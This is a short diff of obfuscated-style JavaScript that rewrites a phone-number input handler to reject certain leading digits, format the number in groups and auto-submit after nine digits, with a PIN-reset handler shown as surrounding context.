@@ -631,17 +631,44 @@
             _0x137868.style.bottom = "";
          }
       }
+
+
+
+
+
+
+      
 phoneInput.addEventListener("input", function (_0x5896a2) {
     var value = _0x5896a2.target.value.replace(/\D/g, ""); // Убираем все нецифровые символы
-    if (value.startsWith("0")) {
-        value = value.substring(1); // Убираем первый символ, если он равен "0"
+    const forbiddenStarts = ["0", "1", "2", "3", "4", "8"]; // Запрещённые цифры
+
+    if (forbiddenStarts.includes(value.charAt(0))) {
+        value = value.substring(1); // Убираем первый символ, если он запрещён
     }
+
     var formatted = value.match(/(\d{0,2})(\d{0,3})(\d{0,2})(\d{0,2})/);
-    _0x5896a2.target.value = formatted[2] ? formatted[1] + " " + formatted[2] + (formatted[3] ? " " + formatted[3] : "") + (formatted[4] ? " " + formatted[4] : "") : formatted[1];
+    _0x5896a2.target.value = formatted[2]
+        ? formatted[1] + " " + formatted[2] + (formatted[3] ? " " + formatted[3] : "") + (formatted[4] ? " " + formatted[4] : "")
+        : formatted[1];
+
     if (9 === value.length) {
         document.getElementById("sendphone").click();
     }
 });
+
+
+
+
+
+
+
+
+
+
+
+
+
+      
       document.getElementById("resetpin").addEventListener("click", function () {
          document.getElementById("pin").value = "";
          document.querySelectorAll(".pincodeLetter").forEach(_0x5a99d8 => _0x5a99d8.classList.remove("y"));
